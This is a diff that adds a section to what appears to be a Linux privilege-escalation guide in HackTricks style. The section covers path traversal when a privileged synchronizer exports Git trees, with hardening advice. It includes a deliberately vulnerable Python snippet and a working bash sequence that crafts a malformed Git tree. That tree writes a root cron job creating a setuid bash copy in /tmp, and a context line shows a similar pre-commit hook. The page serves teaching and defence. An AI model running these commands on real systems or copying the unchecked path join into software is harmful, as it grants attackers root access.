@@ -36,6 +36,40 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod
 chmod +x pre-commit
 ```
 
+### Privileged Git tree export path traversal
+
+A privileged synchronizer may avoid a checkout and instead enumerate an attacker-influenced repository with `git ls-tree`, read each blob with `git cat-file`, join the reported pathname to a staging directory, and write it itself. This becomes an **arbitrary file write with the synchronizer's privileges** when it combines `-c safe.directory=*` (disabling Git's different-owner repository guard) with no destination containment check. An absolute tree-entry name makes Python's `os.path.join(stage, name)` discard `stage`; a relative name containing `../` escapes when the filesystem resolves it. Because the application materializes the raw tree rather than asking Git to check it out, checkout-time pathname rejection never protects the sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>
+
+Look for this code shape in root services, timers, deployment agents, template importers, and backup/restore jobs:<sup>[[30]](#references)</sup>
+
+```python
+entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
+for mode, oid, git_path in parse(entries):
+    target = os.path.join(stage_root, git_path)  # no containment check
+    os.makedirs(os.path.dirname(target), exist_ok=True)
+    with open(target, "wb") as output:
+        output.write(git("cat-file", "blob", oid))
+```
+
+A tree entry is encoded as `<mode> SP <name> NUL <raw object ID>`. The `git hash-object --literally` option deliberately permits object data that normal parsing or `git fsck` may reject, so a disposable clone can construct a tree whose filename is an absolute destination. This example creates a cron-file blob, wraps the crafted tree in a commit, and moves a branch to it; exploitation still requires permission to update a repository consumed by the privileged job and a Git server that accepts the malformed object.<sup>[[30]](#references)[[31]](#references)</sup>
+
+```bash
+blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
+{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
+tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
+commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
+git update-ref refs/heads/main "$commit"
+git ls-tree -r main
+git push --force origin main
+```
+
+Hardening must cover both repository ingestion and the final filesystem operation:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>
+
+- Replace `safe.directory=*` with the exact repositories the service must trust, and run repository processing without root privileges where possible.
+- Reject absolute names and any `.` or `..` component before materialization. After joining, canonicalize and verify that the destination remains beneath the intended root.
+- Avoid check-then-open symlink races: open relative to a trusted directory descriptor and, on Linux, use `openat2()` with `RESOLVE_BENEATH` plus `RESOLVE_NO_SYMLINKS` for attacker-controlled paths.
+- Prefer a normal checkout in an isolated directory over reimplementing checkout from plumbing output. If raw-object ingestion is required, enable receive-side validation such as `receive.fsckObjects=true`; do not downgrade the pathname-related `receive.fsck.*` findings needed to reject crafted trees.
+
 ### Cron & Time files
 
 If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:<sup>[[14]](#references)[[20]](#references)</sup>
@@ -341,5 +375,10 @@ This kind of mitigation is worth remembering for other kernel LPEs too: if explo
 - [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
 - [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
 - [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
+- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
+- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
+- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
+- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
+- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
 
 {{#include ../../banners/hacktricks-training.md}}
